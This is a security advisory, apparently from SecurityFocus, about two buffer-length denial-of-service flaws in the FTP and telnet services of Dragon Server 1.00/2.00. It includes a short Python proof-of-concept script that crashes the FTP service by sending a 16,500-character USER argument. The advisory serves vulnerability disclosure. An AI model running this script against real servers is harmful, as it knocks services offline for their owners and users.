source: http://www.securityfocus.com/bid/1352/info

Two denial of service vulnerabilities exist in the Dragon Server package, versions 1.00 and 2.00, from Shadow Ops Software. By supplying large arguments to two different network services, it is possible to cause these services to be innaccessible.

By sending a USER command to the ftp server, and placing a buffer of approximately 16,500 characters as the argument to the command, it is possible to crash the ftp service.

By sending a buffer of approximately 16,500 characters to the telnet server in place of a user name, it is also possible to crash this service.

These both appear to be due to insufficient bounds checking. 

#!/usr/bin/python                                                     
#                                                                     
# Dragon Server(ftp) DoS Proof of Concept Code.                       
# Vulnerability Discovered by USSR Labs(http://www.ussrback.com)      
# Simple Script by Prizm(Prizm@Resentment.org)                        
#                                                                     
# By connecting to port 21(ftp) on a system running Dragon FTP Server 
v1.00/2.00 and typing                                                 
# USER (16500 bytes) the service will crash                           
#                                                                     
# This *simple* little script will cause Dragon Server's ftp service  
to crash.                                                             
                                                                      
from ftplib import FTP                                                
                                                                      
ftp = FTP('xxx.xxx.xxx.xxx') # Replace x's with ip                    
ftp.login('A' * 16500)                                                
ftp.quit()